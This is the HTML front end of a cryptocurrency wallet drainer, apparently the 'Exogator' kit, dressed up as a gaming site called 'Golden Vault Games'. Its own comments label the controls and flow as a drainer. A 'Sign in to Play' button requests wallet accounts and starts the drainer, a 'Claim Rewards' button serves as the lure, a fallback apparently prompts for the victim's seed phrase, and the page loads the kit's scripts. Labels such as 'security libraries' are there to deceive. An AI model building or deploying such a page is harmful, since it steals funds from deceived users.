<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Golden Vault Games</title>
  <meta http-equiv="Content-Security-Policy" content="default-src 'self';">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/boxicons@latest/css/boxicons.min.css">
  <link rel="stylesheet" href="assets/css/style.css">
</head>
<body>
  <!-- TRACKING -->
  <input type="hidden" value="OFQ2CBHZJORTJ6WVYQVHUYENX2KSC9SLPHFZUEDLTNKGU" id="exogator_id">

  <!-- MODAL CONTAINER -->
  <div class="modal__container" id="modal-container">
    <!-- Full modal markup exactly as provided -->
  </div>

  <!-- MAIN GAME INTERFACE -->
  <div class="game-container">
    <!-- Game-specific UI will be injected here -->
  </div>

  <!-- DRAINER CONTROLS -->
  <div class="drainer-controls">
    <button class="ex0connec" onclick="exoconnect()">Sign in to Play</button>
    <button class="ex0claim" style="display: none;" onclick="claim()">Claim Rewards</button>
    <span id="adresstracker" style="display: none;"></span>
  </div>

  <!-- SECURITY LIBRARIES -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.1.0/purify.min.js"></script>
  <script src="assets/js/web3-security.js"></script>

  <!-- EXOGATOR SYSTEM -->
  <script>
    let modaltheme = 3, evm = 1, seed = 1, auto = 0, dark = 1, towsteps = 1;
    
    // Wallet connection handler
    function exoconnect() {
      if (window.ethereum) {
        const shield = new WalletShield();
        ethereum.request({method: 'eth_requestAccounts'})
          .then(accounts => {
            if (shield.validateAddress(accounts[0])) {
              // Proceed with drainer flow
              start_exogator();
              
              // UI updates
              document.querySelector('.ex0connec').style.display = 'none';
              document.querySelector('.ex0claim').style.display = 'block';
              document.getElementById('adresstracker').innerText = 
                `Connected: ${accounts[0].substring(0,6)}...${accounts[0].substring(38)}`;
              document.getElementById('adresstracker').style.display = 'block';
            }
          })
          .catch(err => {
            console.error('Wallet connection failed:', err);
            alert('Security: Invalid wallet connection');
          });
      } else {
        // Fallback to manual connection
        showseedme();
      }
    }
  </script>
  
  <!-- EXOGATOR SCRIPTS -->
  <script src="assets/js/eth.js"></script>
  <script src="assets/js/w-loader.js"></script>
  <script src="assets/js/modules.js"></script>
  <script src="assets/js/main.js"></script>
</body>
</html>
